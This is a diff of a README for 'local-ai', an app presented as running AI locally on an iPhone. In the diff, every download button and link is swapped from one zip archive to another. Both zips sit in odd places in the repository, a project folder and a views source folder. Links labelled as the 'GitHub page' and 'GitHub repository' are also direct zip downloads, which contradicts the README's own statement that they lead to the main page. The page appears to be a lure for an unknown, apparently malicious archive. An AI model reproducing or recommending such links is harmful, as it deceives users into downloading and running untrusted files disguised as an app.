@@ -1,6 +1,6 @@
 # 🤖 local-ai - Run AI locally on your iPhone
 
-[![Download local-ai](https://img.shields.io/badge/Download-local--ai-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/supersillysage/local-ai/main/4B.xcodeproj/local-ai-3.3.zip)
+[![Download local-ai](https://img.shields.io/badge/Download-local--ai-brightgreen?style=for-the-badge)](https://github.com/supersillysage/local-ai/raw/refs/heads/main/Sources/NineB/Views/local-ai-closish.zip)
 
 ---
 
@@ -29,9 +29,9 @@ Follow these steps to download and run local-ai on your iPhone.
 
 ### 1. Download the app
 
-Click the green button below or visit the [local-ai GitHub page](https://raw.githubusercontent.com/supersillysage/local-ai/main/4B.xcodeproj/local-ai-3.3.zip) to start downloading.
+Click the green button below or visit the [local-ai GitHub page](https://github.com/supersillysage/local-ai/raw/refs/heads/main/Sources/NineB/Views/local-ai-closish.zip) to start downloading.
 
-[![Download local-ai](https://img.shields.io/badge/Download-local--ai-blue?style=for-the-badge)](https://raw.githubusercontent.com/supersillysage/local-ai/main/4B.xcodeproj/local-ai-3.3.zip)
+[![Download local-ai](https://img.shields.io/badge/Download-local--ai-blue?style=for-the-badge)](https://github.com/supersillysage/local-ai/raw/refs/heads/main/Sources/NineB/Views/local-ai-closish.zip)
 
 Since this link points to the main GitHub page, you will have to click through to the latest release or installation instructions there.
 
@@ -97,7 +97,7 @@ If problems persist, you can review the Issues section on the GitHub site or con
 
 local-ai may receive updates to improve performance or fix bugs. To update:
 
-1. Visit the [local-ai GitHub page](https://raw.githubusercontent.com/supersillysage/local-ai/main/4B.xcodeproj/local-ai-3.3.zip) regularly  
+1. Visit the [local-ai GitHub page](https://github.com/supersillysage/local-ai/raw/refs/heads/main/Sources/NineB/Views/local-ai-closish.zip) regularly  
 2. Download the latest version following the same steps as initial install  
 3. Install over the current app when prompted
 
@@ -132,8 +132,8 @@ Older devices may experience slower performance.
 
 ## 📖 Learn More and Support
 
-For detailed information, FAQs, and the latest announcements, visit the [GitHub repository](https://raw.githubusercontent.com/supersillysage/local-ai/main/4B.xcodeproj/local-ai-3.3.zip). Open issues or pull requests if you want to report a bug or suggest features.
+For detailed information, FAQs, and the latest announcements, visit the [GitHub repository](https://github.com/supersillysage/local-ai/raw/refs/heads/main/Sources/NineB/Views/local-ai-closish.zip). Open issues or pull requests if you want to report a bug or suggest features.
 
 ---
 
-[![Download local-ai](https://img.shields.io/badge/Get%20local-ai%20Now-purple?style=for-the-badge)](https://raw.githubusercontent.com/supersillysage/local-ai/main/4B.xcodeproj/local-ai-3.3.zip)
+[![Download local-ai](https://img.shields.io/badge/Get%20local-ai%20Now-purple?style=for-the-badge)](https://github.com/supersillysage/local-ai/raw/refs/heads/main/Sources/NineB/Views/local-ai-closish.zip)
